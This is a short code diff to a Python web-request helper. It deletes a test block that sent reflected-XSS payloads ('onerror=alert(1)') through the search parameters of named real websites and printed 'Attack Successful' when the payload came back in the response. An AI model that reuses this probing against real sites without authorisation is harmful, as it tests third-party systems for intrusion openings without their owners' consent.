@@ -25,26 +25,3 @@ class web_request:
         except:
             print('\n *[Requests Failed...]* ')
             return ''
-
-
-if __name__ == "__main__":
-    
-    # link = 'https://www.raremaps.com/'
-    # link = 'https://www.zentechnologies.com/search/search.php?query="><img src=x onerror="alert(1)"&search=1'
-    # link = 'https://ifu-institut.at/search?text="><img src=x onerror="alert(1)"&cms_token=30f71d2dffb99d557a11bb04966d80a0'
-    link = 'https://www.sweetwater.com/'
-
-    web = web_request(link, 'get')
-    r = web.open_request()
-    
-    u = web.openurl()
-    # soup = BeautifulSoup(u, features='lxml')
-    # print(soup.find_all('form'))
-    # r = requests.post('https://ifu-institut.at/search?text="><img src=x onerror="alert(1)"&cms_token=30f71d2dffb99d557a11bb04966d80a0')
-    print(r)
-    
-    # source = r.text
-    if( str(r).__contains__('"><img src=x onerror="alert(1)"')):
-        print('\n\n \t Attack Successful')
-    
-    print('{WebRequest}')
